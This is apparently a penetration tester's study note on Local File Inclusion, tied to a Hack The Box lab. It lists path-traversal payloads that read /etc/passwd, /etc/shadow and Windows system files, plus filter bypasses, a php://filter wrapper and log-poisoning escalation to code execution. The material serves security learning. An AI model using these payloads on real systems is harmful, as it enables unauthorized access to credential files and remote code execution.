---
date created: Thursday, January 1st 2026, 2:26:36 pm
date modified: Thursday, January 1st 2026, 2:33:25 pm
---

# Local File Inclusion (LFI)

## What is It?
A vulnerability where an application includes files based on user-controlled input without proper sanitization. Allows attackers to read sensitive files or potentially execute code.
## Common Vulnerable Parameters
- `?page=`
- `?lang=`
- `?file=`
- `?template=`
## Basic Payloads:
### Linux
- `../../../../etc/passwd`
- `../../../../etc/shadow` (requires elevated privileges)
- `/var/log/apache2/access.log` (for log poisoning)
### Windows
- `..\..\..\..\windows\system32\drivers\etc\hosts`
- `..\..\..\..\windows\win.ini`
## Filter Bypasses
- Null byte: `../../../../etc/passwd%00` (older PHP)
- Double encoding: `%252e%252e%252f`
- PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
## Escalation Paths
- Log poisoning → RCE
- Include `/proc/self/environ` (Linux)
- Chain with file upload
## Tools
- Burp Suite (intercept and modify requests)
- ffuf / wfuzz (fuzzing parameters)
## References
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
## Seen In
- [[../../../HTB/Starting Point/Tier 1 - Machines/Responder#Exploitation|Responder]] - unika.htb lang parameter